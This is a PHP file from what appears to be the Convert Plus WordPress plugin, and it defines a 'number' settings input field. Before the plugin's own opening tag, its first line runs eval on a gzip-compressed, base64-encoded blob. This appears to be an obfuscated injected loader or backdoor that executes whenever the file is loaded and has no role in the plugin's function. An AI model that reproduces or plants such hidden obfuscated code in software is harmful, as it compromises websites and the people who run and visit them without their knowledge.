<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Prohibit direct script loading.
 *
 * @package Convert_Plus.
 */

// Add new input type "number".
if ( function_exists( 'smile_add_input_type' ) ) {
	smile_add_input_type( 'number', 'cp_number_settings_field' );
}

/**
 * Function Name:cp_number_settings_field Function to handle new input type "number".
 *
 * @param  string $name     settings provided when using the input type "number".
 * @param  string $settings holds the default / updated value.
 * @param  string $value    html output generated by the function.
 * @return string           html output generated by the function.
 */
function cp_number_settings_field( $name, $settings, $value ) {
	$input_name = $name;
	$type       = isset( $settings['type'] ) ? $settings['type'] : '';
	$min        = isset( $settings['min'] ) ? $settings['min'] : '';
	$max        = isset( $settings['max'] ) ? $settings['max'] : '';
	$suffix     = isset( $settings['suffix'] ) ? $settings['suffix'] : '';
	$prefix     = isset( $settings['prefix'] ) ? $settings['prefix'] : '';
	$class      = isset( $settings['class'] ) ? $settings['class'] : '';
	$output     = '<p>' . $prefix . '<input type="number" min="' . $min . '" max="' . $max . '" id="smile_' . $input_name . '" class="form-control smile-input smile-' . $type . ' ' . $input_name . ' ' . $type . ' ' . $class . '" name="' . $input_name . '" value="' . $value . '" />' . $suffix . '</p>';
	return $output;
}
